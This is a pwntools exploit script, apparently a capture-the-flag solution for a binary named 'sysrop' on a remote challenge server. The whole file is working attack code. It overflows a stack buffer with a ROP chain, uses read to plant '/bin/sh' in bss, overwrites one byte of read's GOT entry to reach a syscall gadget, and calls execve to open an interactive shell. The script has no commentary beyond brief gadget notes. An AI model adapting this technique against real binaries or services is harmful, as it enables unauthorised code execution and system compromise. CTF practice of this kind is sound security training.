from pwn import *
r=remote("ctf.j0n9hyun.xyz",3024)
#r=process("./sysrop")
lib=ELF("./libc.so.6")
b=ELF("./sysrop")
context.log_level='debug'

read=b.plt['read']
read_got=b.got['read']
ppppr=0x00000000004005ea #: pop rax ; pop rdx ; pop rdi ; pop rsi ; ret
pppr=0x4005eb # rdx rdi rsi ret
bss=0x601060

pay=b'a'*0x10
pay+=b'x'*0x8
pay+=p64(pppr)
pay+=p64(7)
pay+=p64(0)
pay+=p64(bss)
pay+=p64(read) # got /bin/sh
pay+=p64(0x4005f2)

r.sendline(pay)
r.send('/bin/sh')

pay2=b'a'*0x10
pay2+=b'x'*0x8
pay2+=p64(pppr)
pay2+=p64(1)
pay2+=p64(0)
pay2+=p64(read_got)
pay2+=p64(read) #1 byte got overwrite
pay2+=p64(ppppr)
pay2+=p64(59)
pay2+=p64(0)
pay2+=p64(bss)
pay2+=p64(0)
pay2+=p64(read)

r.send(pay2)
r.send('\x5e')
r.interactive()
